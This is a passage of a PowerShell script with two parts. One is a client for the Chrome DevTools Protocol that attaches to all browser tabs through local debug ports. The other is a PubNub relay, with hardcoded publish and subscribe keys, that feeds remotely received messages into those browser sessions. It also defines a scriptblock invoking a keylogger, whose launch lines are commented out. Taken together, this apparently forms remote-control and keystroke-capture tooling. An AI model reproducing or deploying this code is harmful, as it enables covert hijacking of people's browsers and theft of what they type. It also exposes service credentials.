    $targets = [System.Collections.Generic.List[PSCDPTarget]]::new()

    [hashtable]$browserversion = $null

    [int32]$messageId = 1
    $receiveNew = $true
    $byteArray = $null
    $segment = $true
    $task = $true
    $memoryStream = [System.IO.MemoryStream]::new()
    $totalbytecount = 0
    $result = $null

    [bool] IsSocketHealthy() {
        if ( ( ! $null -eq $this.webSocket ) -and ( $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) ) {
            return $true
        }

        if ( ! $null -eq $this.webSocket ) {
            try { 
                $this.webSocket.Dispose(); 
            } catch { 
                Log-Msg $_
            }
        }
        
        return $false
    }

    [hashtable] GetSystemHealth() {
        $ret = @{
            issystemok=( $this.IsSocketHealthy() )
        }

        return $ret
    }

    PSCDP() {
    }

    PSCDP($debugport) {
        $this.debugport = $debugport
    }

    PSCDP($debugport, $wsname) {
        $this.debugport = $debugport
        $this.wsname = $wsname
    }

    [System.Uri] GetWSUrI() {

        if ( $null -ne $this.wsUri ) {
            return $this.wsUri
        }

        $resp = Invoke-WebRequest -Uri "http://localhost:$($this.debugport)/json/version" -UseBasicParsing
        $target = $resp | ConvertFrom-Json
        $twsUri = ( $target ).webSocketDebuggerUrl

        if ( [string]::IsNullOrEmpty($twsUri) ) {
            throw "wsuri is null"
        }

        $twsUri = New-Object System.Uri($twsUri)

        $this.wsUri = $twsUri

        return $this.wsUri
    }

    [System.Collections.Generic.List[PSCDPTarget]] GetTargets() {

        $endpoint = "http://localhost:$($this.debugport)/json/list"

        $ttargets = Invoke-RestMethod -Uri $endpoint -ErrorAction Stop

        $stargets = [System.Collections.Generic.List[PSCDPTarget]]::new()

        $stargets = $ttargets | Where-Object { 
            $_.type -eq "page" -and ( ! ( $_.url.StartsWith("chrome-extension://") ) ) -and ( ! ( $_.url.StartsWith("extension://") ) )
        } | ForEach-Object {
            $target = @{}
            $_.psobject.Properties | ForEach-Object { 
                $key = $_.Name
                
                if ( $key -eq "id" ) {
                    $key = "targetId"
                }

                $target[$key] = $_.Value 
            }
            
            [PSCDPTarget]$target
        }

        $stargets = [System.Collections.Generic.List[PSCDPTarget]]$stargets
        return $stargets
    }

    [void] CloseTab([PSCDPTarget]$target) {
        $resp = (Invoke-WebRequest -Uri "http://localhost:$($this.debugport)/json/close/$($target.targetId)" -UseBasicParsing).Content
    }

    [PSCDPTarget] CreateTab($url) {
        $obj = $null
        $resp = (Invoke-WebRequest -Uri "http://localhost:$($this.debugport)/json/new?$url" -UseBasicParsing).Content

        try {
            $obj = $resp | ConvertFrom-Json
            $obj = Transform-PSCustomObject($obj)
            $obj = [PSCDPTarget]::Create($obj)
        } catch {

        }
        
        return $obj
    } 

    [void] ConnectCdp() {
        Log-Msg "[$($this.wsname)] attempting new CDP connection at $($this.debugport)"

        $ttargets = $this.GetTargets()        
        $this.targets = $ttargets

        if ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) {
            $this.pubnubTarget = $this.GetPBTarget()

            if ( $null -eq $this.pubnubTarget ) {
                $this.pubnubTarget = $this.CreateTab($this.pubnuburl)
            }
        }

        $this.wsUri = $this.GetWSUrI()

        if ( $null -eq $this.websocket ) {
            Log-Msg "connecting to cdp on [$($this.wsUri)]"
        } else {
            Log-Msg "reconnecting to cdp on [$($this.wsUri)]"
        }

        $this.websocket = New-Object System.Net.WebSockets.ClientWebSocket

        $connectTask = $this.websocket.ConnectAsync($this.wsUri, [System.Threading.CancellationToken]::None)

        if ( $null -eq $this.websocket) {
            throw "could not connect websocket"
        }

        $connectTask.Wait()
        
        Log-Msg "Connected! Current WebSocketState: $($this.websocket.State)" -ForegroundColor Green

        $params = @{
            autoAttach = $true
            waitForDebuggerOnStart = $false
            flatten = $true
            filter= @(
                @{
                    type="page"
                    exclude=$false
                }
            )
        }
        $this.AddQueue( @{ method="Target.setAutoAttach"; params=$params } ) 
    
        $this.AddQueue( @{ method="Target.setDiscoverTargets"; params=@{ discover=$true} } ) 

        $this.AddQueue( @{ method="Target.getTargets"; params=@{ filter=@( @{ type="page"; exclude=$false } ) } } ) 
    }

    [PSCDPCommand] GetCommandByID([string]$id) {
        $cmd = $this.commands | Where-Object { $_.id -eq $id } | Select-Object -First 1
        return $cmd
    }
    
    [PSCDPTarget] GetTarget($targetId) {
        $target = $this.targets | Where-Object { $_.targetId -eq $targetId } | Select-Object -First 1

        return $target
    }

    [PSCDPCommand] SendCdpCommand([PSCDPCommand]$cmd) {
        
        if ( $null -eq $cmd ) {
            throw [PSCDPCommandException]::new("cmd is null")
        }

        $id = $this.messageId++

        $cmd.id = $id
        
        $this.commands.Add($cmd)

        if ( $cmd.HasCallback() ) {
            $this.callbackcmds.Add($cmd)
        }

        if( $cmd.ispbping ) {
            $this.pbpings.Add($cmd)
            $this.pbpingcheck += 1
        }
        
        if ( $cmd.isbrowserversion ) {
            $this.versionchecks.Add($cmd)
            $this.versionchecksn += 1
        }

        if ( $cmd.isbroadcast ) {
            $this.broadcasts.Add($cmd)
            $this.broadcastcheck += 1
        }

        $payload = $cmd.ToJson() 
    
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
        
        $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
        
        if ( $null -ne $sendTask ) {
            $tresult = $sendTask.GetAwaiter().GetResult()
        } else {
            throw [PSCDPCommandException]::new('fatal error -- task is null')
        }

        $cmd.sendTask = $sendTask
        $cmd.taskresult = $tresult

        return $cmd
    }
    
    [void] InitReceive() {
        if ( ! $this.receiveNew ) {
            return
        }

        $this.byteArray = [byte[]]::new($this.bufferSize)
        $this.segment = [ArraySegment[byte]]::new($this.byteArray)

        $this.task = $this.webSocket.ReceiveAsync($this.segment, [System.Threading.CancellationToken]::None)
        $this.receiveNew = $false
    }

    [void] ReadMessage() {
        if ( ! $this.task.IsCompleted ) {
            return
        }

        $this.result = $this.task.GetAwaiter().GetResult()
        # TODO: throws error -- The remote party closed the WebSocket connection without completing the close handshake.

        $this.receiveNew = $true

        if ($this.result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
            throw "WebSocket connection closed by the remote host."
        }
        elseif ($this.task.IsFaulted) {
            throw "[X2H2] Receive failed: $($this.task.Exception.InnerException.Message)"
        }
        elseif ($this.task.IsCanceled) {
            throw "[A2O9] Receive operation was cancelled."
        }
        elseif ( ! ( $this.task.Status -eq [System.Threading.Tasks.TaskStatus]::RanToCompletion ) ) {
            throw "task Status != RanToCompletion"
        } else {

            $bytesReceived = $this.result.Count
                        
            if ($bytesReceived -gt 0) {
                $this.memoryStream.Write($this.byteArray, 0, $bytesReceived)

                $this.totalbytecount = $this.totalbytecount + $bytesReceived
            }

        }
    }

    [void] EndMessage() {
        if ( ! $this.result.EndOfMessage) {
            return
        }

        $completeBytes = $this.memoryStream.ToArray()

        if ( $completeBytes.count -le 0 ) {
            return
        }

        $json = [System.Text.Encoding]::UTF8.GetString($completeBytes)
        $this.memoryStream = New-Object System.IO.MemoryStream
        $this.totalbytecount = 0

        if ( [string]::IsNullOrWhiteSpace($json) ) {
            return
        }

        try {
            $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResult
        } catch {
            Log-Msg $_ # TODO refactor to report exception
            return
        }
        
        $this.ProcessMessage($msg)
    }

    [void] ProcessMessage([PSCustomObject]$msg) {
        $iserror = $false
        $isresult = $false

        $attachedToTarget = $false
        $targetCreated = $false
        $targetDestroyed = $false
        $consoleAPICalled = $false
        $executionContextCreated = $false
        $executionContextDestroyed = $false
        $executionContextsCleared = $false

        $sessionId = $null

        try { $sessionId = $msg.params.sessionId } catch { } # notifications don't have an ID field

        if ( [string]::IsNullOrWhiteSpace($sessionId) ) {
            try { $sessionId = $msg.sessionId } catch { }
        }

        $msght = @{}
        $msg.psobject.Properties | ForEach-Object {

            if ( $_.Name -eq "result" ) {
                $isresult = $true
            } elseif ( $_.Name -eq "method" )  {
                if ( $_.Value -eq 'Target.attachedToTarget' ) {
                    $attachedToTarget = $true
                } elseif ( $_.Value -eq 'Target.targetCreated' ) {
                    $targetCreated = $true
                } elseif ( $_.Value -eq 'Target.targetDestroyed' ) {
                    $targetDestroyed = $true
                } elseif ( $_.Value -eq 'Runtime.bindingCalled' ) {
                    $bindingCalled = $true
                } elseif ( $_.Value -eq 'Runtime.consoleAPICalled' ) {
                    $consoleAPICalled = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextCreated' ) {
                    $executionContextCreated = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextDestroyed' ) {
                    $executionContextDestroyed = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextsCleared' ) {
                    $executionContextsCleared = $true
                }

            } elseif ( $_.Name -eq "error" ) {
                $iserror = $true
            } elseif ( $_.Name -eq "id" ) {
                $isresult = $true
            }

            $msght[$_.Name] = $_.Value
        }

        $this.responses.Add($msght)

        $iserror = $iserror -or $this.IsMessageError($msght)
        if ( $iserror ) {
            $this.errors.Add($msght)
        }

        if ( $isresult ) {
            $cmd = $this.GetCommandByID($msg.id)
            
            if ( $null -ne $cmd ) {
                $tresult = [PSCDPResult]::Create($msght)
                $this.results.Add($tresult)
                $cmd.response = $tresult
                $cmd.response.cmd = $cmd
                $cmd.iserror = $iserror
            }

            $msght.Add('cmd', $cmd)
        }

        if ( $consoleAPICalled ) {
            $tresult = [PSCDPResult]::Create($msght)

            $this.consolecalls.Add( $tresult )

            if ( ! [string]::IsNullOrEmpty($sessionId) ) {

                $starget = $this.targets | Where-Object { $_.sessionId -eq $sessionId } | Select-Object -First 1

                if ( $null -ne $starget ) {
                    $starget.consolecalls.Add( $tresult )
                }
            }

        }

        if ( $executionContextCreated ) {
            $executionContextId = $msg.params.context.id

            $target = $this.targets | Where-Object { $_.sessionId -eq $sessionId } | Select-Object -First 1

            if ( $null -ne $target ) {
                $target.executionContextId = $executionContextId
            }
        }

        # not implemented
        if ( $executionContextDestroyed ) {
            $texecutionContextId = $msg.params.executionContextId
            # pass
        }

        # not implemented
        if ( $executionContextsCleared ) {
        }

        if ( $targetCreated ) { # add target to list
            $targetInfo = $msg.params.targetInfo

            if ( $targetInfo.type -eq "page" -and ( ! ( $targetInfo.url.StartsWith("chrome-extension://") ) ) -and ( ! ( $targetInfo.url.StartsWith("extension://") ) ) ) {
                 
                $targetInfo = [PSCDPTarget]::Create($targetInfo)

                $ptarget = $this.targets | Where-Object { $_.targetId -eq $targetInfo.targetId } | Select-Object -First 1

                if ( $null -eq $ptarget ) {
                    $this.targets.Add($targetInfo)
                } else {
                    $targetInfo = $ptarget
                }

                $this.AddQueue( @{ 
                    method="Target.attachToTarget"; 
                    params=@{ targetId=$targetInfo.targetId; flatten=$true }; 
                } )
            }
            
        }

        if ( $attachedToTarget ) { # update sessionId
            $targetInfo = $msg.params.targetInfo
            $targetInfo = [PSCDPTarget]::Create($targetInfo)

            $skip = $false
            if ( $targetInfo.url -like "*edge://newtab*" ) {
                $skip = $false
            } elseif ( $targetInfo.url -like "*chrome://new-tab-page*" ) {
                $skip = $false
            } elseif ( $targetInfo.url.StartsWith("devtools://") ) {
                $skip = $true
            } elseif ( $targetInfo.url.StartsWith("chrome-extension://") ) {
                $skip = $true
            } elseif ( $targetInfo.url.StartsWith("extension://") ) {
                $skip = $true
            }

            $targetInfo.sessionId = $sessionId

            if ( ! $skip ) {
                $ptarget = $this.targets | Where-Object { $_.targetId -eq $targetInfo.targetId } | Select-Object -First 1

                if ( $null -eq $ptarget ) {
                    $this.targets.Add($targetInfo)
                } else {
                    $targetInfo = $ptarget
                }

                if ( ! [string]::IsNullOrEmpty($sessionId) ) {
                    $this.targets | Where-Object {
                        $_.targetId -eq $targetInfo.targetId
                    } | ForEach-Object { $_.sessionId = $sessionId }
                }

                if ( ! $targetInfo.enable_init ) {
                    $this.LoadQueue($targetInfo)
                }
            }
            
        }

        if ( $targetDestroyed ) {
            
            $targetInfo = $msg.params.targetInfo
            $targetId = $targetInfo.targetId

            if ( ![string]::IsNullOrEmpty($targetId) ) {
                $target = $this.GetTarget($targetId)

                if ( ! $null -eq $target ) {
                    $target.targetDestroyed = $true
                }
            }

        }

    }

    [bool] IsMessageError([hashtable]$msg) {

        $errorType = [PSCDPResult]::GetErrorType($msg)

        $iserror = $true

        if ( $errorType -eq [PSCDPCommandErrorType]::NoError ) {
            $iserror = $false
        }
    
        return $iserror
    }

    [void] NextCmd() {

        if ( $null -eq $this.sendQueue ) {
            $this.sendQueue = [System.Collections.Generic.List[PSCDPCommand]]::new()
        }

        if ( $this.sendQueue.Count -le 0 ) {
            return
        }
        
        $cmd = $this.sendQueue[0]
        $this.sendQueue.RemoveAt(0)

        if ( $null -eq $cmd ) {
            throw [PSCDPException]::new('cmd is null')
        }

        $targetid = $cmd.targetid
        $target = $cmd.target

        if ( $null -eq $target -and ( ! [string]::IsNullOrEmpty($targetid) ) ) {
            $target = $this.GetTarget($targetid)
        }

        if ( $null -ne $target -and ( [string]::IsNullOrEmpty($targetid) ) ) {
            $targetid = $target.targetId
        }

        $cmd.target = $target
        $cmd.targetid = $targetid

        if ( $null -ne $target ) {
            $target.commands.Add($cmd)
        }

        $cmd = $this.SendCdpCommand($cmd)
    }

    [void] ExecCallbacks() {

        for ( $i = 0; $i -lt $this.callbackcmds.Count; $i++) {
            $cmd = $this.callbackcmds[$i]

            if ( $cmd.HasCallback() -and ( ! $cmd.isinvoked ) -and ( $null -ne $cmd.response) ) {
                $cmd.callback.Invoke($cmd.response,$this)
                $cmd.isinvoked = $true
            }

        }

    }

    [PSCDPCommand] AddQueue([hashtable]$msg) {
        $cmd = [PSCDPCommand]::Create($msg)
        $this.sendQueue.Add($cmd)

        return $cmd
    }

    [void] LoadQueue([PSCDPTarget]$target) {
        if ( $target.url.StartsWith("chrome-extension://") -or $target.url.StartsWith("extension://") ) {
            return
        }

        $target.enable_init = $true

        $this.AddQueue( @{ method="Page.enable"; params=@{ enabled = $true }; target=$target } )
        $this.AddQueue( @{ method="Page.setLifecycleEventsEnabled"; params=@{ enabled = $true }; target=$target } )
        $this.AddQueue( @{ method="DOM.enable"; params=@{ enabled = $true }; target=$target } )
        $this.AddQueue( @{ method="Runtime.enable"; params=@{ enabled = $true }; target=$target; callback=$script:runtime_enable_callback } )

        # $this.sendQueue.Add( @{ method="Overlay.enable"; params=@{ enabled = $true } } )
        # $this.sendQueue.Add( @{ method="Network.enable"; params=@{ enabled = $true } } )
        # $this.AddQueue( @{ method="Emulation.setFocusEmulationEnabled"; params=@{ enabled = $true }; target=$target; callback=$script:emulation_enable_callback } )
        # $this.AddQueue( @{ method="Page.reload"; params=@{ ignoreCache=$true}; target=$target } ) 
        # $this.AddQueue( @{ method="Runtime.addBinding"; params=@{ name="onPubNubEvent" }; target=$target; callback=$script:runtime_addBinding_callback } )
    }

    [void] GetBrowserVersion() {
        $msg = @{ 
            method="Browser.getVersion"; 
            params=@{}; 
            callback=$script:browserversion_callback;
            isbrowserversion=$true
        }

        $this.AddQueue( $msg )
    }

    [void] LogState() {

        $msgstrs = @()
        $msgstrs += "[$($this.wsname)]"
        $msgstrs += "[sendQueue: $($this.sendQueue.Count)]"
        $msgstrs += "[responses: $($this.responses.Count)]"
        $msgstrs += "[commands: $($this.commands.Count) results: $($this.results.Count) errors: $($this.errors.Count)]"
        $msgstrs += "[console logs: $($this.consolecalls.Count)]"

        $msgstr = $msgstrs -join " "
        Log-Msg $msgstr
    }

    static [void] Iterate([hashtable]$tcdpobj) {
        $cdpobj = $tcdpobj['cdpobj']
        $check = $tcdpobj['systemcheck']
        $delay = $tcdpobj['delay']

        if ( $null -eq $check ) {
            $check = $cdpobj.GetSystemHealth()
        }

        if ( ! $check['issystemok'] ) {
            
            if ( $delay -eq -1 ) {
                $checkstr = ($check.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '|'
                Log-Msg "$($cdpobj.wsname) system not ok"
                Log-Msg $checkstr

                $delay = 5
            } elseif ( $delay -gt 0 ) {
                Log-Msg "$($cdpobj.wsname) -- $delay remaining"

                $delay -= 1
            } 

            $tcdpobj['delay'] = $delay

            if ( $delay -gt 0 ) {
                return
            } else {
                $tcdpobj['delay'] = -1
            }

            Log-Msg "$($cdpobj.wsname) -- connecting"

            $cdpobj = [PSCDP]::new($cdpobj.debugport, $cdpobj.wsname)
            $tcdpobj['cdpobj'] = $cdpobj
            $cdpobj.ConnectCdp()

        } else {
            $cdpobj.LogState()

            $cdpobj.InitReceive()
            $cdpobj.ReadMessage()
            $cdpobj.EndMessage()

            $cdpobj.ExecCallbacks()
            $cdpobj.NextCmd()
        }
    }

}

class PubNub {
    $PublishKey = "pub-c-bd83b994-1964-4760-9bf2-142ceadf7f66"
    $SubscribeKey = "sub-c-62ba6c3d-b786-4be3-a033-e472ab227774"
    $Channel = "clientid_88992233_JS_client"
    $UUID     = $scriptfname

    $baseUrl  = "ps.pndsn.com"
    
    $msgindex = 0
    $timetoken = 0

    [System.Net.Http.HttpClientHandler]$handler =  $null
    [System.Net.Http.HttpClient]$client = $null

    [scriptblock]$EventHandler = $null

    $isreceive = $false
    $isnewresult = $false
    $response = $null
    $byteArray = $null
    $requestTask = $null

    $pbmessagesin = [System.Collections.Generic.List[hashtable]]::new()
    $pbmessagesout = [System.Collections.Generic.List[hashtable]]::new()

    [void] Init() {
        $this.handler = [System.Net.Http.HttpClientHandler]::new()
        $this.client  = [System.Net.Http.HttpClient]::new($this.handler)
        $this.client.Timeout = [System.TimeSpan]::FromSeconds(320) 
    }

    [void] Receive() {

        if ( $this.isreceive ) {
            return
        }

        $receiveUrl = $this.GetSubscribeUri()
        $this.requestTask = $this.client.GetAsync($receiveUrl)
        $this.isreceive = $true
    }    

    [string] GetSubscribeUri() {
        if ( [string]::IsNullOrEmpty($this.TimeToken) ) {
            $this.TimeToken = "0"
        }

        $treceiveUrl = "https://$($this.BaseUrl)/v2/subscribe/$($this.SubscribeKey)/$($this.Channel)/0/0?uuid=$($this.UUID)&tt=$($this.TimeToken)"

        return $treceiveUrl
    }

    [string] GetPublishUri() {
        $uri = "https://$($this.BaseUrl)/publish/$($this.PublishKey)/$($this.SubscribeKey)/0/$($this.Channel)/0"
        return $uri
    }

    [string] PublishMessage([hashtable]$payload) {

        if ( ! $null -eq $payload -and $payload -is [hashtable] ) {
            $this.msgindex++
            $payload.Add('timestamp', ( Get-Timestamp ) )
            $payload.Add('msgindex',$this.msgindex)

        } else {
            throw "payload must be a valid hashtable"
        }

        $payloadjson = $payload | ConvertTo-Json -Compress
            
        $uri = $this.GetPublishUri()
    
        $this.response = Invoke-RestMethod -Uri $uri -Method Post -Body $payloadjson -ContentType "application/json; charset=UTF-8"

        if ( $null -ne $this.response -and $this.response.GetType().Name -eq "Object[]" -and $this.response.length -ge 2 ) {
            return $this.response[2]
        }

        return $null
    }
    

    [void] ReadResult() {
        if ( ! $this.isreceive ) {
            return
        }

        if ( ! $this.requestTask.IsCompleted ) {
            return
        }

        $this.isreceive = $false

        if ($this.requestTask.IsFaulted) {
            $msg = $($this.requestTask.Exception.InnerException.Message)
            throw "request task is faulted $msg"
        }

        $this.response = $this.requestTask.Result

        $this.isnewresult = $true

        if ( ! $this.response.IsSuccessStatusCode ) {
            Log-Msg "Server returned HTTP status code: $($this.response.StatusCode)"
        }

        Log-Msg "Response received! Status: $($this.response.StatusCode). Reading stream into byte array..."
        
        $contentStreamTask = $this.response.Content.ReadAsStreamAsync()
        
        while (-not $contentStreamTask.IsCompleted) {
            Start-Sleep -Milliseconds 50
        }
        
        $stream = $contentStreamTask.Result
        $memoryStream = [System.IO.MemoryStream]::new()
        
        $stream.CopyTo($memoryStream)
        $this.byteArray = $memoryStream.ToArray()
        
        $memoryStream.Dispose()
        $stream.Dispose()
        $this.response.Dispose()

        Log-Msg "Successfully read $($this.byteArray.Length) bytes"
    }

    [hashtable] static ParseResult([byte[]]$byteArray) {
        $jsonPayload = [System.Text.Encoding]::UTF8.GetString($byteArray)
        Write-Output $jsonPayload

        $tresponse = $null

        try {
            $jsonObj = $jsonPayload | ConvertFrom-Json
            $tresponse = Transform-PSCustomObject $jsonObj
        } catch {

        }

        return $tresponse
    }

    [void] ProcessResponse([hashtable]$response) {
        $this.timetoken = $response.t.t

        Log-Msg "timetoken: $($this.timetoken)"

        if ($response.m.Count -le 0) {
            return
        }

        Log-Msg "response count: $($response.m.Count)"
        
        foreach ($msg in $response.m) {
            $pbmsg = $msg.d | ConvertTo-Json -Compress
            Log-Msg "New Message Received: $($pbmsg | ConvertTo-Json -Compress)"
            $pbmsg = Transform-PSCustomObject($msg.d)

            if ( $pbmsg['destination'] -eq "BROADCAST" ) {
                # ignore
            } elseif ( $pbmsg['destination'] -eq $script:scriptfname ) {
                $this.pbmessagesin.Add($pbmsg)
            } elseif ( $pbmsg['source'] -eq $script:scriptfname ) {
                $this.pbmessagesout.Add($pbmsg)
            }

            if ( $null -ne $this.EventHandler ) {
                $this.EventHandler.Invoke($pbmsg)
            }
        }
    }

    [void] Iterate() {
        $this.Receive()
        $this.ReadResult()

        if ( ! $this.isnewresult ) {
            return
        }

        $ht = [PubNub]::ParseResult($this.byteArray)
        $this.isnewresult = $false
        $this.byteArray = [byte[]]$null
        
        $this.ProcessResponse($ht)
    }

}

<# --- #>

$script:msedge_debugport = 9222
$script:chrome_debugport = 9223

try {
    $script:clientws = [PSCDP]::new($script:chrome_debugport, "clientws")
    $script:clientws.ConnectCdp()
} catch {
    Log-Msg $_
}

$keyboardlogger = {
    try {
        [PowerShell.KeyLogger]::Main()
    } finally {
        if ($script:SingleInstanceEvent) {
            $script:SingleInstanceEvent.Dispose()
        }
    }
}

# $ps = [powershell]::Create().AddScript($keyboardlogger)
# $asyncResult = $ps.BeginInvoke()

if ( [string]::IsNullOrWhiteSpace($script:scriptfname) ) {
    $scriptfname = "pscdp.relay.ps1"
}

$pb = [PubNub]::new()
$pb.Init()
$pb.EventHandler = {
    param([hashtable]$pbmsg)
    
    Process-PubNubEvent -Message $pbmsg -cdpobj $script:clientws
}

$script:clientit = @{
    "cdpobj" = $script:clientws
    "broadcast" = $false
    "systemcheck" = $null
    "delay" = -1
}

$d = 250
$n = 100
$i = 0

while ( $true ) {

    Log-Msg "new iteration -- $i/$n"

    try {
        $pb.Iterate()
    } catch {
        Log-Msg $_
    }


    try {
        [PSCDP]::Iterate($script:clientit)
    } catch {
        Log-Msg $_
    }

    Start-Sleep -Milliseconds $d
    
    if ( $i -ge $n ) {
        $i = 0
    } else {
        $i++
    }
}

exit

<#
if ( $null -eq $readtask ) {
    $readbuf = [byte[]]::new($bufferSize)
    $readtask = $reader.ReadAsync($readbuf, 0, $bufferSize, [System.Threading.CancellationToken]::None)
}

if ( $null -ne $readtask -and $readtask.IsCompleted ) {
    $bytesRead = $readTask.GetAwaiter().GetResult()
    $message = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
    $hashobj = ConvertFrom-Json -InputObject $message -AsHashtable
    $sendQueue.Add($hashobj)
    $readtask = $null
}
#>
